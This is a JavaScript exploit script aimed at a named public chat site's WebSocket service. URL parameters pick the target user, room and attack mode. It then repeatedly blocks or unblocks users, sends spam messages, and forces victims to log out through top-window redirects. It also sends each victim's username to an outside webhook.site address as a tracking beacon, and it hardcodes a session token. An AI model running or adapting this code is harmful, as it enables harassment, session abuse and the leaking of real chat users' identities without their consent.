console.log("start exploit...");
const urlParams = new URLSearchParams(window.location.search);
const target_user = urlParams.get('id');
const ROOM = urlParams.get('rm');
const attack_type = urlParams.get('att');
const MSG = urlParams.get('msg');
const repeat_time = parseInt(urlParams.get('rt'));
const conn_time = parseInt(urlParams.get('ct'));
var blockall = false;
var unblockall = false;
var guest = false;
var allok = false;
var guestname = 'Dragon';
var user = '';
var role = '';
var timer = '';
ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
ws.onmessage = function(m) {
  var jsonData = JSON.parse(m.data);
  var dataType = jsonData.type;
  console.log("message----",jsonData.data);
  if(dataType=="register"){
    user = jsonData.data.username;
    role = jsonData.data.role
    if(jsonData.data.status=="success"){
      if((user != 'mazhai')&&((user.indexOf(target_user) > -1)||(target_user == 'all'))){
        getip();
        timer = window.setInterval(function() {
          if(attack_type=='sb') {self_blocker();}
          else if(attack_type=='sub') {self_unblocker();}
          else if(attack_type=='bl') {blocker();}
          else if(attack_type=='sm') {send(ROOM, MSG);}
          else if(attack_type=='lo') {loghimout();}
          else {console.log("nothing");}
        }, repeat_time);
      }
    }
    if(jsonData.data.status=="guest"){
      guest = true;
      register(guestname);
    }
    if(jsonData.data.type=="error"){
      guestname = guestname + Math.floor((Math.random() * 10) + 1);
      register(guestname);
    }
  }
  if(dataType=="blocks"){
    if(jsonData.data.blocks){
      if(unblockall) {
          jsonData.data.blocks.forEach((i)=>ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}})));
          unblockall = false;
      }
    }
  }
  if(dataType=="onliners"){
    if(jsonData.data.onliners){
      if(blockall) {
          jsonData.data.onliners.forEach((i)=>ws.send(JSON.stringify({"type":"block-user","data":{"username":i.username}})));
          blockall = false;
      }
    }
  }
}
console.log("ws--",ws);
initsession = () => {
    ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2rkbi"}}));
}
register = (guestname) => {
     if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":guestname,"gender":"male"}}));}
}
send = (room,msg) => {
  console.log("state:", attack_type, user, role);
  if(ws.OPEN){
    ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
    ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
  }
}
getblocklist = () => {
   if(ws.OPEN){
    ws.send(JSON.stringify({"type":"blocks","data":["a"]}));
   }
}
blocker = () => {
  console.log("state:", attack_type, user, role);
     if(ws.OPEN){
    ws.send(JSON.stringify({"type":"block-user","data":{"username":"sam londonn"}}));
   }
}
fetch_room = (r) => {
     if(ws.OPEN){
    ws.send(JSON.stringify({"type":"fetch","data":{"room":r}}));
   }
}
self_blocker = () => {
  console.log("state:", attack_type, user, role);
    blockall = true;
    fetch_room(ROOM);
}
self_unblocker = () => {
  console.log("state:", attack_type, user, role);
    unblockall = true;
getblocklist();
}

loghimout = () => {
  console.log("state:", attack_type, user, role);
    window.top.location.href = "http://chatroom.tamil2friends.com/login.php";
parent.location.href = "http://chatroom.tamil2friends.com/login.php";
}

getip = () => {
  console.log("state:", attack_type, user, role);
  var img = new Image();
  img.src = "https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c="+user;
  var div = document.getElementById('x');
  img.onload = function() {
    div.innerHTML += '<img src="'+img.src+'" />';
  };
}

ws.onopen = () => {
  initsession();
  register(guestname);
  window.setTimeout(function() {
    register(guestname);
  }, 1000);
  window.setTimeout(function() {
    ws.close();
      console.log("closed");
      window.clearInterval(timer);
  }, conn_time);
}
